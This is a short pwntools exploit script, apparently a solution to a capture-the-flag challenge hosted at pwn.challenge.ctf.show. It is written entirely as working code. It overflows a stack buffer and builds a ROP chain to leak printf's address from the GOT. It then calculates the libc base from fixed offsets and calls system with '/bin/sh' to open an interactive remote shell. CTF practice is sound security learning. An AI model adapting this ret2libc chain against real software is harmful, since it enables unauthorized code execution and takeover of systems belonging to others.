from pwn import *
p=remote('pwn.challenge.ctf.show',28141)
elf=ELF('./pwn01')
pop_rdi=0x400703
pop_ret=0x4004ce
main=0x4005F7
#------
payload1=b'a'*(0x20+8)+p64(pop_ret)
payload1+=p64(pop_rdi)+p64(elf.got['printf'])
payload1+=p64(elf.plt['printf'])+p64(pop_ret)+p64(main)
p.recv()
p.sendline(payload1)
printf_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(printf_addr))
#------
system=0x04f440
binsh=0x1b3e9a
printf=0x064e80
base=printf_addr-printf
system+=base
binsh+=base
#------
payload2=b'a'*(0x20+8)
payload2+=p64(pop_rdi)+p64(binsh)
payload2+=p64(pop_ret)+p64(system)
p.sendline(payload2)
p.interactive()
